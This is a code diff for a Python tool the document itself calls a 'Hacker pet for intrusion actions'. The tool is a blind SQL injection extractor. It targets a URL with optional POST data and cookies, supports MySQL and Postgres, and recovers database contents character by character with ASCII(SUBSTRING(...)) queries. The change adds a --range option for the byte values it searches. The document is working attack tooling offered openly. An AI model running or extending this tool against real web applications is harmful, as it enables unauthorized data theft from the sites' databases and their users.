@@ -13,8 +13,9 @@ p = argparse.ArgumentParser( description = 'Hacker pet for intrusion actions...'
 p.add_argument( '-u' , '--url'              , required = True          , help = 'url with possible GET data'      )
 p.add_argument( '-p' , '--post'             , metavar = 'POST'         , help = 'to send POST data use this var'  )
 p.add_argument( '-c' , '--cookie'           , metavar = 'COOKIE'       , help = 'cookie to send with POST or GET' )
-p.add_argument( '-v' , '--verbose'          , action = 'append_const' , const = 1, default = [],  help = 'how much verbose should be output' )
+p.add_argument( '-v' , '--verbose'          , action = 'append_const'  , const = 1, default = [],  help = 'how much verbose should be output' )
 p.add_argument( '-a' , '--avoid'            , default = ''             , help = 'string of characters wich should be avoided in sql queries' )
+p.add_argument( '-r' , '--range'            , default = '32-126'       , help = 'possible values for bytes in SQL result' )
 p.add_argument( '-e' , '--error2false'      , action = 'store_const', const = True, help = 'if server return error identify this fact as false answer for SQL query' )
 p.add_argument( '-E' , '--engine'           , default = 'mysql', choices = ['mysql', 'postgres'], help = 'engine of database'  )
 p.add_argument( '-D' , metavar = 'DATABASE' , help = 'database to use' )
@@ -150,7 +151,7 @@ class Searcher( object ):
         return lmax
 
 
-    def get( self, sql, lmin = 32, lmax = 126 ):
+    def get( self, sql ):
         self.log( 0, 'find length of %s' % sql )
         l = self.get_number( 'length(%s)' % sql )
         self.log( 0, '...length=%s' % l )
@@ -158,7 +159,7 @@ class Searcher( object ):
         self.log( 0, '...', newline = False )
         res = ''
         for i in xrange( l ):
-            c = self.get_number( 'ASCII(SUBSTRING(%s,%s,1))' % ( sql, i+1 ), lmin = lmin, lmax = lmax )
+            c = self.get_number( 'ASCII(SUBSTRING(%s,%s,1))' % ( sql, i+1 ), lmin = self.rang[ 0 ], lmax = self.rang[ 1 ] )
             res += chr( c )
             self.log( 0, chr( c ), newline = False )
         self.log( 0, '--> ' + res )
@@ -211,6 +212,7 @@ s = Searcher( url = args.url,
               bench = args.timebased,
               post = args.post,
               th_num = 1,
+              rang = map( int, args.range.split( '-' ) ),
               log_lvl = len( args.verbose ) )
 sql = SQL( args.engine )
 
